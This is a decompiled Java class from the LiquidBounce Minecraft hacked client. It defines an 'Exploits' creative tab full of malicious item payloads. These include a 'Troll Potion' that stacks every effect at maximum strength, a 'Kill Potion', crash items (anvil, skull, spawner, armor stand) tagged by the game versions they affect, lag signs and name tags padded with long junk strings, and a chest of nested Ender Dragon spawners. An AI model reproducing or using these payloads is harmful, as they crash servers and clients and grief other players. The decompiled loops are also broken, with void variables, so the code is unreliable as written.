/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  kotlin.jvm.internal.Intrinsics
 */
package net.ccbluex.liquidbounce.tabs;

import java.util.List;
import java.util.Objects;
import kotlin.jvm.internal.Intrinsics;
import net.ccbluex.liquidbounce.api.enums.BlockType;
import net.ccbluex.liquidbounce.api.enums.ItemType;
import net.ccbluex.liquidbounce.api.minecraft.item.IItem;
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagCompound;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagList;
import net.ccbluex.liquidbounce.api.util.WrappedCreativeTabs;
import net.ccbluex.liquidbounce.injection.backend.WrapperImpl;
import net.ccbluex.liquidbounce.utils.item.ItemUtils;

public final class ExploitsTab
extends WrappedCreativeTabs {
    /*
     * WARNING - void declaration
     */
    @Override
    public void displayAllReleventItems(List<IItemStack> itemList) {
        IItemStack trollPotion = WrapperImpl.INSTANCE.getClassProvider().createItemStack(WrapperImpl.INSTANCE.getClassProvider().getItemEnum(ItemType.POTION_ITEM));
        trollPotion.setItemDamage(16395);
        INBTTagList trollPotionEffects = WrapperImpl.INSTANCE.getClassProvider().createNBTTagList();
        int n = 1;
        int n2 = 27;
        while (n <= n2) {
            void i;
            INBTTagCompound effect = WrapperImpl.INSTANCE.getClassProvider().createNBTTagCompound();
            effect.setInteger("Amplifier", Integer.MAX_VALUE);
            effect.setInteger("Duration", Integer.MAX_VALUE);
            effect.setInteger("Id", (int)i);
            trollPotionEffects.appendTag(effect);
            ++i;
        }
        trollPotion.setTagInfo("CustomPotionEffects", trollPotionEffects);
        trollPotion.setStackDisplayName("\u00a7c\u00a7lTroll\u00a76\u00a7lPotion");
        itemList.add(trollPotion);
        IItemStack killPotion = WrapperImpl.INSTANCE.getClassProvider().createItemStack(WrapperImpl.INSTANCE.getClassProvider().getItemEnum(ItemType.POTION_ITEM));
        killPotion.setItemDamage(16395);
        INBTTagCompound effect = WrapperImpl.INSTANCE.getClassProvider().createNBTTagCompound();
        effect.setInteger("Amplifier", 125);
        effect.setInteger("Duration", 1);
        effect.setInteger("Id", 6);
        INBTTagList effects = WrapperImpl.INSTANCE.getClassProvider().createNBTTagList();
        effects.appendTag(effect);
        killPotion.setTagInfo("CustomPotionEffects", effects);
        killPotion.setStackDisplayName("\u00a7c\u00a7lKill\u00a76\u00a7lPotion");
        itemList.add(killPotion);
        IItemStack crashAnvil = WrapperImpl.INSTANCE.getClassProvider().createItemStack(WrapperImpl.INSTANCE.getClassProvider().getBlockEnum(BlockType.ANVIL));
        crashAnvil.setStackDisplayName("\u00a78Crash\u00a7c\u00a7lAnvil \u00a77| \u00a7cmc1.8-mc1.8");
        crashAnvil.setItemDamage(16384);
        itemList.add(crashAnvil);
        IItemStack crashHead = WrapperImpl.INSTANCE.getClassProvider().createItemStack(WrapperImpl.INSTANCE.getClassProvider().getItemEnum(ItemType.SKULL));
        INBTTagCompound compound = WrapperImpl.INSTANCE.getClassProvider().createNBTTagCompound();
        compound.setString("SkullOwner", " ");
        crashHead.setTagCompound(compound);
        crashHead.setStackDisplayName("\u00a78Crash\u00a76\u00a7lHead \u00a77| \u00a7cmc1.8-mc1.10");
        itemList.add(crashHead);
        itemList.add(ItemUtils.createItem("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}").setStackDisplayName("\u00a78Crash\u00a7c\u00a7lSpawner \u00a77| \u00a7cmc1.8-mc1.8"));
        itemList.add(ItemUtils.createItem("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}").setStackDisplayName("\u00a78Crash\u00a72\u00a7lStand \u00a77| \u00a7cmc1.10"));
        StringBuilder lagStringBuilder = new StringBuilder();
        int n3 = 0;
        int n4 = 499;
        while (n3 <= n4) {
            void i;
            lagStringBuilder.append("/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=");
            ++i;
        }
        itemList.add(ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + lagStringBuilder + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + lagStringBuilder + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + lagStringBuilder + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + lagStringBuilder + "\\\"}\"}}").setStackDisplayName("\u00a78Lag\u00a72\u00a7lSign \u00a77| \u00a7cmc1.8"));
        itemList.add(ItemUtils.createItem("spawn_egg 1 64"));
        itemList.add(ItemUtils.createItem("spawn_egg 1 63"));
        itemList.add(ItemUtils.createItem("spawn_egg 1 53"));
        itemList.add(ItemUtils.createItem("name_tag 1 0 {display:{Name: \"" + lagStringBuilder + "\"}}"));
        itemList.add(Objects.requireNonNull(ItemUtils.createItem("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}")).setStackDisplayName("\u00a7cInfinity \u00a7a\u00a7lFirework"));
        IItemStack iItemStack = ItemUtils.createItem("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s}],value:\"Chest\",Lock:\"\"}}");
        if (iItemStack == null) {
            Intrinsics.throwNpe();
        }
        itemList.add(iItemStack.setStackDisplayName("\u00a7c\u00a7lEnder\u00a7c\u00a7a\u00a7lDragon \u00a7bSpawner Chest"));
    }

    @Override
    public IItem getTabIconItem() {
        IItem iItem = WrapperImpl.INSTANCE.getClassProvider().createItemStack(WrapperImpl.INSTANCE.getClassProvider().getItemEnum(ItemType.POTION_ITEM)).getItem();
        if (iItem == null) {
            Intrinsics.throwNpe();
        }
        return iItem;
    }

    @Override
    public String getTranslatedTabLabel() {
        return "Exploits";
    }

    @Override
    public boolean hasSearchBar() {
        return true;
    }

    public ExploitsTab() {
        super("Exploits");
        this.getRepresentedType().setBackgroundImageName("item_search.png");
    }
}

